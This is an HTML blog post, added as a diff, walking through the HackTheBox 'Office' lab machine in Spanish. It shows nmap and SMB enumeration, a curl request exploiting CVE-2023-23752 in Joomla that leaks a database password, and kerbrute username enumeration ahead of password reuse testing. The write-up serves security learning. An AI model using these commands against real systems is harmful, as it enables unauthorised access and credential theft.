@@ -1,0 +1,1678 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Office (hard) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Office (hard)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/hard/2024/07/19/office.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/hard/2024/07/19/office.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-07-19T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Office (hard)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-07-19T00:00:00-06:00","datePublished":"2024-07-19T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Office (hard)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/hard/2024/07/19/office.html"},"url":"http://localhost:4000/hackthebox/machines/hard/2024/07/19/office.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Office (hard)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-07-19T00:00:00-06:00" itemprop="datePublished">
+        Jul 19, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/2cdef06b99725f3dcce38431a95b7b77.png" />
+</p>
+
+<ul>
+  <li>Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing LibreOffice macros after disabling the <code class="language-plaintext highlighter-rouge">MacroSecurityLevel</code> registry value, abusing MSKRP to dump DPAPI credentials and abusing Group Policies due to excessive Active Directory privileges.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Puertos abiertos y servicios que están abiertos por el protocolo <strong>TCP</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49669,58531,58538,58562 10.10.11.3 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-07-18 17:50 CST
+Nmap scan report <span class="k">for </span>10.10.11.3
+Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
+|_http-title: Home
+| http-robots.txt: 16 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
+| /joomla/administrator/ /administrator/ /api/ /bin/
+| /cache/ /cli/ /components/ /includes/ /installation/
+|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
+|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
+|_http-generator: Joomla! - Open Source Content Management
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-07-19 07:49:54Z<span class="o">)</span>
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Not valid before: 2023-05-10T12:36:58
+|_Not valid after:  2024-05-09T12:36:58
+|_ssl-date: 2024-07-19T07:51:27+00:00<span class="p">;</span> +7h59m33s from scanner time.
+443/tcp   open  ssl/http      Apache httpd 2.4.56 <span class="o">(</span>OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
+|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
+| tls-alpn:
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_http-title: 403 Forbidden
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Not valid before: 2023-05-10T12:36:58
+|_Not valid after:  2024-05-09T12:36:58
+|_ssl-date: 2024-07-19T07:51:28+00:00<span class="p">;</span> +7h59m33s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-07-19T07:51:27+00:00<span class="p">;</span> +7h59m33s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Not valid before: 2023-05-10T12:36:58
+|_Not valid after:  2024-05-09T12:36:58
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-07-19T07:51:28+00:00<span class="p">;</span> +7h59m33s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Not valid before: 2023-05-10T12:36:58
+|_Not valid after:  2024-05-09T12:36:58
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+58531/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+58538/tcp open  msrpc         Microsoft Windows RPC
+58562/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Hosts: DC, www.example.com<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+|_clock-skew: mean: 7h59m32s, deviation: 0s, median: 7h59m32s
+| smb2-time:
+|   <span class="nb">date</span>: 2024-07-19T07:50:47
+|_  start_date: N/A
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Estamos ante un Domain Controller.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.3
+SMB         10.10.11.3      445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregar los dominios al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.3 office.htb dc.office.htb DC.office.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.11.3 office.htb dc.office.htb DC.office.htb
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos a comenzar enumerando recursos compartidos por el protocolo <strong>SMB</strong>.</p>
+  </li>
+  <li>
+    <p>Si probamos con varias herramientas vemos que no podemos ya que no contamos con credenciales.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.3 <span class="nt">-u</span> <span class="s2">"miguelito"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
+SMB         10.10.11.3      445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.3      445    DC               <span class="o">[</span>-] office.htb<span class="se">\m</span>iguelito: STATUS_LOGON_FAILURE
+❯ smbmap <span class="nt">-H</span> 10.10.11.3 <span class="nt">--no-banner</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 0 SMB session<span class="o">(</span>s<span class="o">)</span>
+❯ smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.11.3
+session setup failed: NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<ul>
+  <li>Tampoco podemos enumerar por el protocolo <strong>RPC</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.11.3
+Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<h2 id="shell-as-web_account">Shell as web_account</h2>
+
+<ul>
+  <li><strong>Nmap</strong> nos reporto que se esta empleando un Joomla como CMS en el puerto <strong>80</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>80/tcp    open  http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
+|_http-title: Home
+| http-robots.txt: 16 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
+| /joomla/administrator/ /administrator/ /api/ /bin/
+| /cache/ /cli/ /components/ /includes/ /installation/
+|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
+|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
+|_http-generator: Joomla! - Open Source Content Management
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/1.png" />
+</p>
+
+<ul>
+  <li>Si examinamos las tecnologías que se están usando no nos reporta la versión del Joomla.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.11.3
+http://10.10.11.3 <span class="o">[</span>200 OK] Apache[2.4.56], Cookies[3815f63d17a9109b26eb1b8c114159ac], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28], HttpOnly[3815f63d17a9109b26eb1b8c114159ac], IP[10.10.11.3], MetaGenerator[Joomla! - Open Source Content Management], OpenSSL[1.1.1t], PHP[8.0.28], PasswordField[password], PoweredBy[the], Script[application/json,application/ld+json,module], Title[Home], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.0.28]
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Existe una herramienta la cual nos permite enumerar el Joomla de manera mas rápida <a href="https://www.kali.org/tools/joomscan/">https://www.kali.org/tools/joomscan/</a>.</p>
+  </li>
+  <li>
+    <p>Ahora ya tenemos la versión.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ joomscan <span class="nt">-u</span> http://10.10.11.3
+
+    ____  _____  _____  __  __  ___   ___    __    _  _
+   <span class="o">(</span>_  _<span class="o">)(</span>  _  <span class="o">)(</span>  _  <span class="o">)(</span>  <span class="se">\/</span>  <span class="o">)</span>/ __<span class="o">)</span> / __<span class="o">)</span>  /__<span class="se">\ </span> <span class="o">(</span> <span class="se">\(</span> <span class="o">)</span>
+  .-_<span class="o">)(</span>   <span class="o">)(</span>_<span class="o">)(</span>  <span class="o">)(</span>_<span class="o">)(</span>  <span class="o">)</span>    <span class="o">(</span> <span class="se">\_</span>_ <span class="se">\(</span> <span class="o">(</span>__  /<span class="o">(</span>__<span class="o">)</span><span class="se">\ </span> <span class="o">)</span>  <span class="o">(</span>
+  <span class="se">\_</span>___<span class="o">)</span> <span class="o">(</span>_____<span class="o">)(</span>_____<span class="o">)(</span>_/<span class="se">\/\_</span><span class="o">)(</span>___/ <span class="se">\_</span>__<span class="o">)(</span>__<span class="o">)(</span>__<span class="o">)(</span>_<span class="o">)</span><span class="se">\_</span><span class="o">)</span>
+			<span class="o">(</span>1337.today<span class="o">)</span>
+
+    <span class="nt">--</span><span class="o">=[</span>OWASP JoomScan
+    +---++---<span class="o">==[</span>Version : 0.0.7
+    +---++---<span class="o">==[</span>Update Date : <span class="o">[</span>2018/09/23]
+    +---++---<span class="o">==[</span>Authors : Mohammad Reza Espargham , Ali Razmjoo
+    <span class="nt">--</span><span class="o">=[</span>Code name : Self Challenge
+    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
+
+Processing http://10.10.11.3 ...
+
+
+
+<span class="o">[</span>+] FireWall Detector
+<span class="o">[</span>++] Firewall not detected
+
+<span class="o">[</span>+] Detecting Joomla Version
+<span class="o">[</span>++] Joomla 4.2.7
+
+<span class="o">[</span>+] Core Joomla Vulnerability
+<span class="o">[</span>++] Target Joomla core is not vulnerable
+
+<span class="o">[</span>+] Checking Directory Listing
+<span class="o">[</span>++] directory has directory listing :
+http://10.10.11.3/administrator/components
+http://10.10.11.3/administrator/modules
+http://10.10.11.3/administrator/templates
+http://10.10.11.3/images/banners
+
+
+<span class="o">[</span>+] Checking apache info/status files
+<span class="o">[</span>++] Readable info/status files are not found
+
+<span class="o">[</span>+] admin finder
+<span class="o">[</span>++] Admin page : http://10.10.11.3/administrator/
+
+<span class="o">[</span>+] Checking robots.txt existing
+<span class="o">[</span>++] robots.txt is found
+path : http://10.10.11.3/robots.txt
+
+Interesting path found from robots.txt
+http://10.10.11.3/joomla/administrator/
+http://10.10.11.3/administrator/
+http://10.10.11.3/api/
+http://10.10.11.3/bin/
+http://10.10.11.3/cache/
+http://10.10.11.3/cli/
+http://10.10.11.3/components/
+http://10.10.11.3/includes/
+http://10.10.11.3/installation/
+http://10.10.11.3/language/
+http://10.10.11.3/layouts/
+http://10.10.11.3/libraries/
+http://10.10.11.3/logs/
+http://10.10.11.3/modules/
+http://10.10.11.3/plugins/
+http://10.10.11.3/tmp/
+
+
+<span class="o">[</span>+] Finding common backup files name
+<span class="o">[</span>++] Backup files are not found
+
+<span class="o">[</span>+] Finding common log files name
+<span class="o">[</span>++] error log is not found
+
+<span class="o">[</span>+] Checking sensitive config.php.x file
+<span class="o">[</span>++] Readable config files are not found
+
+
+Your Report : reports/10.10.11.3/
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>El CMS Joomla es Open Source y puedes ver los archivos de configuración en su GitHub <a href="https://github.com/joomla/joomla-cms">https://github.com/joomla/joomla-cms</a>.</p>
+  </li>
+  <li>
+    <p>Si buscamos por vulnerabilidades encontramos el CVE-2023-23752 <a href="https://github.com/Acceis/exploit-CVE-2023-23752">https://github.com/Acceis/exploit-CVE-2023-23752</a> es un Unauthorized Access to webservice endpoints que nos permite ver información importante, aquí nos comparten la ruta donde se aplica <a href="https://www.exploit-db.com/exploits/51334">https://www.exploit-db.com/exploits/51334</a>.</p>
+  </li>
+  <li>
+    <p>Vemos una contraseña.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s1">'http://office.htb/api/index.php/v1/config/application?public=true'</span> | jq <span class="nb">.</span>
+<span class="o">{</span>
+  <span class="s2">"links"</span>: <span class="o">{</span>
+    <span class="s2">"self"</span>: <span class="s2">"http://office.htb/api/index.php/v1/config/application?public=true"</span>,
+    <span class="s2">"next"</span>: <span class="s2">"http://office.htb/api/index.php/v1/config/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20"</span>,
+    <span class="s2">"last"</span>: <span class="s2">"http://office.htb/api/index.php/v1/config/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20"</span>
+  <span class="o">}</span>,
+  <span class="s2">"data"</span>: <span class="o">[</span>
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"offline"</span>: <span class="nb">false</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"offline_message"</span>: <span class="s2">"This site is down for maintenance.&lt;br&gt;Please check back again soon."</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"display_offline_message"</span>: 1,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"offline_image"</span>: <span class="s2">""</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"sitename"</span>: <span class="s2">"Holography Industries"</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"editor"</span>: <span class="s2">"tinymce"</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"captcha"</span>: <span class="s2">"0"</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"list_limit"</span>: 20,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"access"</span>: 1,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"debug"</span>: <span class="nb">false</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"debug_lang"</span>: <span class="nb">false</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"debug_lang_const"</span>: <span class="nb">true</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"dbtype"</span>: <span class="s2">"mysqli"</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"host"</span>: <span class="s2">"localhost"</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"user"</span>: <span class="s2">"root"</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"password"</span>: <span class="s2">"H0lOgrams4reTakIng0Ver754!"</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"db"</span>: <span class="s2">"joomla_db"</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"dbprefix"</span>: <span class="s2">"if2tx_"</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"dbencryption"</span>: 0,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
+      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
+      <span class="s2">"attributes"</span>: <span class="o">{</span>
+        <span class="s2">"dbsslverifyservercert"</span>: <span class="nb">false</span>,
+        <span class="s2">"id"</span>: 224
+      <span class="o">}</span>
+    <span class="o">}</span>
+  <span class="o">]</span>,
+  <span class="s2">"meta"</span>: <span class="o">{</span>
+    <span class="s2">"total-pages"</span>: 4
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>La contraseña es de la base de datos <code class="language-plaintext highlighter-rouge">H0lOgrams4reTakIng0Ver754!</code> pero podemos probarla en el panel de login del Joomla aun así.</p>
+  </li>
+  <li>
+    <p>Si recordamos hay un usuario que se llama Tony Stark.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/2.png" />
+</p>
+
+<ul>
+  <li>No funcionan.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/3.png" />
+</p>
+
+<ul>
+  <li>Bueno tenemos una contraseña pero no usuarios lo que podemos hacer es enumerar usuarios del dominio con kerbrute <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /opt/kerbrute_linux_amd64 userenum <span class="nt">-d</span> office.htb <span class="nt">--dc</span> dc.office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 07/18/24 - Ronnie Flathers @ropnop
+
+2024/07/18 18:20:37 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2024/07/18 18:20:37 <span class="o">&gt;</span>  	dc.office.htb:88
+
+2024/07/18 18:20:59 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 administrator@office.htb
+2024/07/18 18:23:13 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Administrator@office.htb
+2024/07/18 18:24:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 etower@office.htb
+2024/07/18 18:24:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 ewhite@office.htb
+2024/07/18 18:24:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 dwolfe@office.htb
+2024/07/18 18:24:21 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 dlanor@office.htb
+2024/07/18 18:24:21 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 dmichael@office.htb
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>users.txt
+administrator
+ewhite
+etower
+dwolfe
+dlanor
+dmichael
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Tenemos usuarios así que ahora podemos usar crackmapexec para ver si algún usuario usa la contraseña.</p>
+  </li>
+  <li>
+    <p>Y bueno el usuario dwolfe usa la contraseña.</p>
